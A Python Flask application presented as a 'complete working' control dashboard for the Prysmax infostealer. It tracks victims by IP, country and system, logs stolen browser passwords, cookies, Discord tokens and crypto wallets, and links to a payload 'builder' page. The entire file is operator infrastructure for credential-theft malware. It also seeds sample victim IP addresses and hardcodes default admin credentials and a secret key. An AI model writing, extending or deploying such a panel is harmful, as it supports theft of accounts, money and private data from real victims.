#!/usr/bin/env python3
"""
Prysmax Stealer Dashboard - Complete Working Version
"""

import os
import sys
from datetime import datetime, timedelta
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'prysmax-secret-key-2024'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///prysmax.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize database
db = SQLAlchemy(app)

# Database Models
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(120), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(100), unique=True, nullable=False)
    ip_address = db.Column(db.String(45), nullable=False)
    country = db.Column(db.String(100), nullable=False)
    system = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(20), default='Active')
    first_seen = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)

class Log(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(100), nullable=False)
    log_type = db.Column(db.String(50), nullable=False)
    message = db.Column(db.Text, nullable=False)
    severity = db.Column(db.String(20), default='Info')
    source = db.Column(db.String(100), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class Statistics(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    date = db.Column(db.Date, unique=True, nullable=False)
    total_clients = db.Column(db.Integer, default=0)
    passwords_captured = db.Column(db.Integer, default=0)
    cookies_stolen = db.Column(db.Integer, default=0)
    discord_tokens = db.Column(db.Integer, default=0)

# Authentication decorator
def require_login(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Routes
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        user = User.query.filter_by(username=username).first()
        
        if user and check_password_hash(user.password_hash, password):
            session['user_id'] = user.id
            session['username'] = user.username
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
@require_login
def dashboard():
    # Get recent victims
    recent_victims = Victim.query.order_by(Victim.last_seen.desc()).limit(10).all()
    
    # Get today's stats
    today = datetime.now().date()
    stats = Statistics.query.filter_by(date=today).first()
    
    if not stats:
        stats = Statistics(
            date=today,
            total_clients=553,
            passwords_captured=26453,
            cookies_stolen=296569,
            discord_tokens=100
        )
    
    # Generate geographic data for the chart
    geo_data = [
        {'country': 'United States', 'count': 145, 'percentage': 26.2},
        {'country': 'Germany', 'count': 89, 'percentage': 16.1},
        {'country': 'Brazil', 'count': 67, 'percentage': 12.1},
        {'country': 'Russia', 'count': 54, 'percentage': 9.8},
        {'country': 'France', 'count': 43, 'percentage': 7.8},
        {'country': 'United Kingdom', 'count': 38, 'percentage': 6.9},
        {'country': 'Others', 'count': 117, 'percentage': 21.1}
    ]
    
    # Generate activity data for the chart
    activity_data = []
    for i in range(7):
        date = datetime.now().date() - timedelta(days=i)
        day_victims = len([v for v in recent_victims if v.first_seen and v.first_seen.date() == date])
        activity_data.append({
            'date': date.strftime('%b %d'),
            'victims': day_victims + (i * 5),  # Add some variation
            'logins': day_victims * 2 + (i * 3)
        })
    
    activity_data.reverse()  # Show oldest to newest
    
    return render_template('dashboard.html', 
                         victims=recent_victims, 
                         stats=stats, 
                         geo_data=geo_data,
                         activity_data=activity_data)

@app.route('/activity-logs')
@require_login
def activity_logs():
    page = request.args.get('page', 1, type=int)
    logs = Log.query.order_by(Log.timestamp.desc()).paginate(
        page=page, per_page=20, error_out=False)
    return render_template('activity_logs.html', logs=logs)

@app.route('/global-stats')
@require_login
def global_stats():
    return render_template('global_stats.html')

@app.route('/admin-panel')
@require_login
def admin_panel():
    users = User.query.all()
    return render_template('admin_panel.html', users=users)

@app.route('/builder')
@require_login
def builder():
    return render_template('builder.html')

@app.route('/profile')
@require_login
def profile():
    user = User.query.get(session['user_id'])
    return render_template('profile.html', user=user)

@app.route('/settings')
@require_login
def settings():
    return render_template('settings.html')

# Error handlers
@app.errorhandler(404)
def not_found_error(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    db.session.rollback()
    return render_template('500.html'), 500

# Initialize database
def init_db():
    with app.app_context():
        db.create_all()
        
        # Create admin user if not exists
        admin = User.query.filter_by(username='admin').first()
        if not admin:
            admin = User(
                username='admin',
                password_hash=generate_password_hash('prysmax123'),
                is_admin=True
            )
            db.session.add(admin)
        
        # Create sample victims
        if Victim.query.count() == 0:
            sample_victims = [
                {'victim_id': 'WH-PQF54N1V79', 'ip': '45.137.201.204', 'country': 'Germany', 'system': 'Windows 11 (22H2)'},
                {'victim_id': 'DESKTOP-D2MQQPQ', 'ip': '179.235.114.16', 'country': 'Brazil', 'system': 'Windows 11 (22H1)'},
                {'victim_id': 'server88', 'ip': '178.60.141.119', 'country': 'Lithuania', 'system': 'Windows 10 (20H2)'},
                {'victim_id': 'DESKTOP-E1WA178', 'ip': '71.56.104.32', 'country': 'United States', 'system': 'Windows 10 (20H1)'},
                {'victim_id': 'DESKTOP-EQF2N5PE', 'ip': '216.10.217.184', 'country': 'Jamaica', 'system': 'Windows 11 (22H1)'},
            ]
            
            for victim_data in sample_victims:
                victim = Victim(
                    victim_id=victim_data['victim_id'],
                    ip_address=victim_data['ip'],
                    country=victim_data['country'],
                    system=victim_data['system'],
                    status='Active'
                )
                db.session.add(victim)
        
        # Create sample logs
        if Log.query.count() == 0:
            sample_logs = [
                {'victim_id': 'WH-PQF54N1V79', 'type': 'Password', 'message': 'Chrome passwords extracted (15 entries)', 'severity': 'Success', 'source': 'Browser'},
                {'victim_id': 'DESKTOP-D2MQQPQ', 'type': 'Cookie', 'message': 'Firefox cookies stolen (234 entries)', 'severity': 'Success', 'source': 'Browser'},
                {'victim_id': 'server88', 'type': 'Token', 'message': 'Discord token captured', 'severity': 'Success', 'source': 'Discord'},
                {'victim_id': 'DESKTOP-E1WA178', 'type': 'Wallet', 'message': 'MetaMask wallet found', 'severity': 'Warning', 'source': 'Crypto'},
                {'victim_id': 'DESKTOP-EQF2N5PE', 'type': 'System', 'message': 'System information collected', 'severity': 'Info', 'source': 'System'},
            ]
            
            for log_data in sample_logs:
                log = Log(
                    victim_id=log_data['victim_id'],
                    log_type=log_data['type'],
                    message=log_data['message'],
                    severity=log_data['severity'],
                    source=log_data['source']
                )
                db.session.add(log)
        
        db.session.commit()

if __name__ == '__main__':
    init_db()
    print("Prysmax Dashboard Starting...")
    print("Access the dashboard at: http://localhost:5000")
    print("Default credentials: admin / prysmax123")
    app.run(host='0.0.0.0', port=5000, debug=False)

